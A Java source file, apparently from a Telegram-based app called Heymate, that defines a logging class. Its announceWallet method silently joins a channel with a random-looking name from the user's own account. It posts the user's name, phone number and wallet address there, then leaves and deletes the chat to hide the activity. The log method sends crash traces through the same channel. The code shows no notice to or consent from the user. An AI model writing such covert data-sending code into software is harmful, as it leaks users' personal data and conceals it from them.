package org.telegram.ui.Heymate.log;

import android.widget.Toast;

import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.SendMessagesHelper;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.UserObject;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.TLRPC;
import org.telegram.ui.ActionBar.BaseFragment;
import org.telegram.ui.Heymate.HeymateConfig;
import org.telegram.ui.Heymate.TG2HM;

import java.io.ByteArrayOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;

import works.heymate.core.Utils;
import works.heymate.core.wallet.Wallet;

public class LogToGroup {

    private static final String NEW_MEMBER_ANNOUNCEMENT_GROUP = "dfhsfishpfusefhsdfjhsdlfkjs";

    public static void announceWallet(BaseFragment fragment, Wallet wallet) {
        TLRPC.TL_contacts_resolveUsername req3 = new TLRPC.TL_contacts_resolveUsername();
        req3.username = NEW_MEMBER_ANNOUNCEMENT_GROUP;

        fragment.getConnectionsManager().sendRequest(req3, (response3, error3) -> {
            if (error3 == null) {
                TLRPC.TL_contacts_resolvedPeer res = (TLRPC.TL_contacts_resolvedPeer) response3;

                if (res.chats != null && !res.chats.isEmpty()) {
                    TLRPC.Chat chat = res.chats.get(0);

                    TLRPC.User user = UserConfig.getInstance(fragment.getCurrentAccount()).getCurrentUser();
                    TLRPC.TL_channels_joinChannel req = new TLRPC.TL_channels_joinChannel();
                    TLRPC.InputChannel inputChat = new TLRPC.TL_inputChannel();
                    inputChat.channel_id = chat.id;
                    inputChat.access_hash = chat.access_hash;
                    req.channel = inputChat;
                    fragment.getConnectionsManager().sendRequest(req, (response, error) -> Utils.runOnUIThread(() -> {
                        if (error != null) {
                            return;
                        }

                        TLRPC.Updates updates = (TLRPC.Updates) response;
                        fragment.getMessagesController().processUpdates(updates, false);

                        StringBuilder message = new StringBuilder();
                        message.append("New wallet created\n");
                        message.append("User name: ");
                        message.append(UserObject.getUserName(user));
                        message.append('\n');
                        message.append("Phone number: +");
                        message.append(TG2HM.getPhoneNumber(fragment.getCurrentAccount()));
                        message.append('\n');
                        message.append("Wallet address: ");
                        message.append(wallet.getAddress());

                        TLRPC.TL_message newMsg = new TLRPC.TL_message();
                        newMsg.media = new TLRPC.TL_messageMediaEmpty();
                        newMsg.message = message.toString();
                        newMsg.attachPath = "";
                        newMsg.local_id = newMsg.id = fragment.getUserConfig().getNewMessageId();
                        newMsg.out = true;
                        newMsg.from_id = new TLRPC.TL_peerUser();
                        newMsg.from_id.user_id = user.id;
                        newMsg.flags |= TLRPC.MESSAGE_FLAG_HAS_FROM_ID;
                        newMsg.random_id = SendMessagesHelper.getInstance(fragment.getCurrentAccount()).getNextRandomId();
                        newMsg.date = fragment.getConnectionsManager().getCurrentTime();
                        newMsg.unread = true;
                        newMsg.dialog_id = chat.id;
                        newMsg.peer_id = new TLRPC.TL_peerChannel();
                        newMsg.peer_id.channel_id = chat.id;

                        TLRPC.TL_messages_sendMessage reqSend = new TLRPC.TL_messages_sendMessage();
                        reqSend.message = message.toString();
                        reqSend.clear_draft = true;
                        reqSend.silent = false;
                        reqSend.peer = new TLRPC.TL_inputPeerChannel();
                        reqSend.peer.channel_id = chat.id;
                        reqSend.peer.access_hash = chat.access_hash;
                        reqSend.random_id = newMsg.random_id;
                        fragment.getConnectionsManager().sendRequest(reqSend, (response1, error1) -> {
                            TLRPC.TL_channels_leaveChannel leaveChannel = new TLRPC.TL_channels_leaveChannel();
                            TLRPC.InputChannel inputChat3 = new TLRPC.TL_inputChannel();
                            inputChat3.channel_id = chat.id;
                            inputChat3.access_hash = chat.access_hash;
                            leaveChannel.channel = inputChat3;
                            fragment.getConnectionsManager().sendRequest(leaveChannel, (response2, error2) -> {
                                AndroidUtilities.runOnUIThread(() -> {
                                    fragment.getMessagesController().deleteDialog(chat.id, 1);
                                }, 100);
                            });
                        });
                    }));
                }
            }
        });
    }

    public static void logIfCrashed(Runnable task) {
        if (HeymateConfig.DEBUG) {
            try {
                task.run();
            } catch (Throwable t) {
                Toast.makeText(ApplicationLoader.applicationContext, "Crashing bug just occured. Consider the app closed!", Toast.LENGTH_LONG).show();
                log("General crash", t, null);
            }
        }
        else {
            task.run();
        }
    }

    public static void log(String message, Throwable t, BaseFragment parent) {
        StringBuilder sb = new StringBuilder();
        if (message != null) {
            sb.append(message);
        }
        if (t != null) {
            sb.append("\n");
            sb.append(t.getMessage());
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(stream));
            t.printStackTrace(writer);
            writer.flush();
            sb.append("\n");
            sb.append(stream.toString());
        }
        log(sb.toString(), parent);
    }

    public static void log(String message, BaseFragment parent) {
        int currentAccount = parent == null ? UserConfig.selectedAccount : parent.getCurrentAccount();

        TLRPC.TL_contacts_resolveUsername req3 = new TLRPC.TL_contacts_resolveUsername();
        req3.username = NEW_MEMBER_ANNOUNCEMENT_GROUP;

        UserConfig userConfig = parent == null ? UserConfig.getInstance(currentAccount) : parent.getUserConfig();
        ConnectionsManager connectionsManager = parent == null ? ConnectionsManager.getInstance(currentAccount) : parent.getConnectionsManager();
        MessagesController messagesController = parent == null ? MessagesController.getInstance(currentAccount) : parent.getMessagesController();

        connectionsManager.sendRequest(req3, (response3, error3) -> {
            if (error3 == null) {
                TLRPC.TL_contacts_resolvedPeer res = (TLRPC.TL_contacts_resolvedPeer) response3;

                if (res.chats != null && !res.chats.isEmpty()) {
                    TLRPC.Chat chat = res.chats.get(0);

                    TLRPC.User user = UserConfig.getInstance(currentAccount).getCurrentUser();
                    TLRPC.TL_channels_joinChannel req = new TLRPC.TL_channels_joinChannel();
                    TLRPC.InputChannel inputChat = new TLRPC.TL_inputChannel();
                    inputChat.channel_id = chat.id;
                    inputChat.access_hash = chat.access_hash;
                    req.channel = inputChat;
                    connectionsManager.sendRequest(req, (response, error) -> Utils.runOnUIThread(() -> {
                        if (error != null) {
                            return;
                        }

                        TLRPC.Updates updates = (TLRPC.Updates) response;
                        messagesController.processUpdates(updates, false);

                        TLRPC.TL_message newMsg = new TLRPC.TL_message();
                        newMsg.media = new TLRPC.TL_messageMediaEmpty();
                        newMsg.message = message.toString();
                        newMsg.attachPath = "";
                        newMsg.local_id = newMsg.id = userConfig.getNewMessageId();
                        newMsg.out = true;
                        newMsg.from_id = new TLRPC.TL_peerUser();
                        newMsg.from_id.user_id = user.id;
                        newMsg.flags |= TLRPC.MESSAGE_FLAG_HAS_FROM_ID;
                        newMsg.random_id = SendMessagesHelper.getInstance(currentAccount).getNextRandomId();
                        newMsg.date = connectionsManager.getCurrentTime();
                        newMsg.unread = true;
                        newMsg.dialog_id = chat.id;
                        newMsg.peer_id = new TLRPC.TL_peerChannel();
                        newMsg.peer_id.channel_id = chat.id;

                        TLRPC.TL_messages_sendMessage reqSend = new TLRPC.TL_messages_sendMessage();
                        reqSend.message = message.toString();
                        reqSend.clear_draft = true;
                        reqSend.silent = false;
                        reqSend.peer = new TLRPC.TL_inputPeerChannel();
                        reqSend.peer.channel_id = chat.id;
                        reqSend.peer.access_hash = chat.access_hash;
                        reqSend.random_id = newMsg.random_id;
                        connectionsManager.sendRequest(reqSend, (response1, error1) -> {
                            if (HeymateConfig.DEBUG) {
                                return;
                            }

                            TLRPC.TL_channels_leaveChannel leaveChannel = new TLRPC.TL_channels_leaveChannel();
                            TLRPC.InputChannel inputChat3 = new TLRPC.TL_inputChannel();
                            inputChat3.channel_id = chat.id;
                            inputChat3.access_hash = chat.access_hash;
                            leaveChannel.channel = inputChat3;
                            connectionsManager.sendRequest(leaveChannel, (response2, error2) -> {
                                AndroidUtilities.runOnUIThread(() -> {
                                    parent.getMessagesController().deleteDialog(chat.id, 1);
                                }, 100);
                            });
                        });
                    }));
                }
            }
        });
    }

}
